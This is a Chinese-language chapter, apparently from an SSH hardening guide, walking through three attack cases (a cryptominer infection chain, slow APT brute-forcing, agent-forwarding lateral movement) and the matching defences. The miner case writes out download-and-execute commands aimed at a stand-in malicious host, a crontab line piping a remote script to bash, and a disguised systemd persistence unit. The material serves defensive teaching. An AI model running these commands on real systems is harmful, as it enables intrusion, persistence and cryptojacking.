# 实战案例分析

本章我们看三个真实世界的攻击案例，理解攻击者是怎么打的，以及我们前面讲的防御技术如何对应。

## 案例 1：挖矿木马的完整入侵链

**事件背景**：某云厂商在 2023 年披露的 XMRig 挖矿木马感染链。

**攻击链还原**：

**阶段 1：侦察（Reconnaissance）**
- 攻击者通过 FOFA 搜索 `"port=22" && protocol="ssh"`
- 拿到数十万暴露的 SSH 服务器列表
- 对每个 IP 端口发送 SSH banner 探测
- 提取 SSH 版本号、操作系统指纹

**阶段 2：武器化（Weaponization）**
- 基于目标系统定制攻击字典
- 包含 top10k 通用字典 + 针对中国用户的拼音字典（"123456"、"woaini"、"admin@123"）
- 准备下载 payload 的 dropper 脚本

**阶段 3：投递（Delivery）**
- 使用分布式 Botnet（每台肉鸡只试 5-10 次）
- 模拟人类行为（sleep 60-120 秒）
- 工作时间集中在中国 UTC+8 时区

**阶段 4：利用（Exploitation）**
- 成功登录后立即执行：
  ```bash
  uname -a
  whoami
  cat /etc/os-release
  ```
- 判断架构（x86_64、aarch64）以选择合适的 binary

**阶段 5：安装（Installation）**
- 下载并执行 XMRig：
  ```bash
  curl -fsSL http://malicious-cdn.com/xmrig.tar.gz | tar xz
  ./xmrig --config config.json
  ```
- 配置 systemd 持久化：
  ```bash
  /etc/systemd/system/redis.service  # 伪装成 redis
  systemctl daemon-reload
  systemctl enable redis.service
  ```
- 配置 crontab：
  ```bash
  * * * * * curl -fsSL http://cdn.com/check.sh | bash
  ```

**阶段 6：命令与控制（C2）**
- XMRig 连接到矿池（pool.minexmr.com、supportxmr.com）
- 矿池地址硬编码在 config.json
- 部分家族用 DNS over HTTPS 隐藏 C2

**阶段 7：目标行动（Actions on Objectives）**
- 开始挖矿（Monero）
- 横向扫描内网其他机器
- 把机器加入代理网络

**对应到我们的防御**：

| 阶段 | 我们应该在哪一层拦住它 |
|---|---|
| 侦察 | 第 1 层（隐藏端口、Zero Trust）|
| 武器化 | 无（攻击者准备阶段） |
| 投递 | 第 4 层（fail2ban、CrowdSec） |
| 利用 | 第 2 层（密钥认证、强密码） |
| 安装 | 第 3 层（sudo 限制、文件权限） |
| 命令与控制 | 第 5 层（auditd、网络流量监控） |
| 目标行动 | 第 6 层（应急响应） |

**经验教训**：

1. 仅靠"复杂密码"完全不够——分布式低速攻击可以破解
2. 第 1 层（减少暴露面）才是性价比最高的防御
3. 横向移动是挖矿木马的主要扩散方式——内网不能掉以轻心

## 案例 2：APT 组织的低速 SSH 暴力

**事件背景**：Mandiant 在 2024 年披露的 APT29（Cozy Bear）针对 Linux 服务器的 SSH 渗透活动。

**APT29 的攻击特征**：

**1. 极低速**
- 单 IP 每小时只尝试 1-2 次
- 单账号每天只尝试 1 次
- 总周期可达数月

**2. 高质量字典**
- 针对目标的 OS、地区、行业定制
- 通过 OSINT（开源情报）收集信息：
  - 员工 LinkedIn 简历（可能有公司域名、姓名）
  - GitHub 公开 commit（可能泄露邮箱格式、习惯）
  - 公开论坛发言（可能有习惯密码风格）

**3. 多阶段融合**
- SSH 暴力只是**初始访问向量**之一
- 同时尝试钓鱼、供应链、VPN 漏洞
- 任何一条路径成功即可

**4. 高度定制 payload**
- 不使用公开挖矿程序
- 自研后门（高级隐匿性）
- 长期潜伏，dwell time 可达数年

**如何识别非典型攻击**：

| 特征 | 典型攻击 | APT 攻击 |
|---|---|---|
| 频率 | 高频（每分钟数次） | 低频（每小时数次） |
| 字典质量 | 通用字典 | 定制字典 |
| 攻击者工具 | 公开工具 | 自研或定制 |
| 攻击目的 | 挖矿、勒索 | 情报、持久化 |
| 持续时间 | 短期 | 数月数年 |

**检测 APT 风格的攻击**：

- **行为基线**：建立每个用户的"正常登录时间/IP/频率"基线，偏离告警

- **跨机器关联**：单台看正常，多台一起看异常

- **OSINT 监控**：监控自家公司信息泄露情况

- **威胁情报订阅**：订阅 Mandiant、Recorded Future 等 APT 报告

**防御思考**：

- 第 4 层（主动阻断）几乎无法拦截 APT
- 第 5 层（入侵检测）和第 6 层（审计响应）才是关键
- **APT 防御的本质是"假设必然失守，专注快速检测和响应"**

## 案例 3：内部人员的横向移动

**事件背景**：某 DevOps 工程师的笔记本被钓鱼，跳板机失守。

**攻击链**：

**阶段 1：获取跳板机权限**
- 笔记本被钓鱼 → 攻击者拿到跳板机的 SSH 私钥
- 攻击者用这个密钥登录跳板机

**阶段 2：枚举内网**
- 在跳板机上扫描内网：
  ```bash
  nmap -p 22 10.0.0.0/24
  ```
- 发现数据库服务器、缓存服务器、K8s 节点等

**阶段 3：横向移动**
- 攻击者发现 SSH Agent Forwarding 被开启
- 利用 Agent Forwarding 在跳板机上**冒充工程师身份**访问其他机器：
  ```bash
  ssh -A db-server  # -A 启用 agent forwarding
  db-server$ ps aux  # 在 db 服务器上执行命令
  ```
- 这种横向不需要 db 服务器的密码或密钥——**Agent Forwarding 让攻击者"借用"原始用户的认证**

**阶段 4：持久化**
- 在 db 服务器上留下后门
- 在 `.ssh/authorized_keys` 添加自己的公钥
- 配置 cron 定期回连

**SSH Agent Forwarding 的滥用风险**：

**原理**：Agent Forwarding 让中间跳板机可以"代理"客户端的认证请求。

```text
client → jump → target
       ↑
client 的 ssh-agent 暴露在 jump 上
jump 上的 root 可以"借用" client 的 agent
```

**风险**：

- jump 上的 root 可以用 client 的 agent 登录 target
- 任何能拿到 jump 上 root 的人 = 拿到 client 的全部 SSH 能力

**正确做法**：

- **避免在生产机器间用 Agent Forwarding**
- 用 **ProxyJump** 替代（ssh 7.3+）：

  ```bash
  # ~/.ssh/config
  Host target
      HostName target.internal
      User app
      ProxyJump jump.example.com
  ```
- ProxyJump 的安全性远高于 Agent Forwarding——认证在客户端到跳板机之间完成，跳板机只转发连接

**ProxyJump vs ProxyCommand**：

- **ProxyJump**：OpenSSH 内置，简单易用

- **ProxyCommand**：用任意命令建立代理（更灵活，但可能误用）

- **Agent Forwarding**：将认证代理转发到跳板机（危险！）

**正确的 SSH config 示例**：

```text
# 推荐：仅用 ProxyJump
Host bastion
    HostName bastion.example.com
    User axu
    IdentityFile ~/.ssh/id_ed25519
    IdentitiesOnly yes

Host prod-app
    HostName 10.0.1.5
    User app
    ProxyJump bastion
    IdentityFile ~/.ssh/id_ed25519_prod

# 不要：Agent Forwarding
# ForwardAgent yes  <-- 永远不要开
```

---
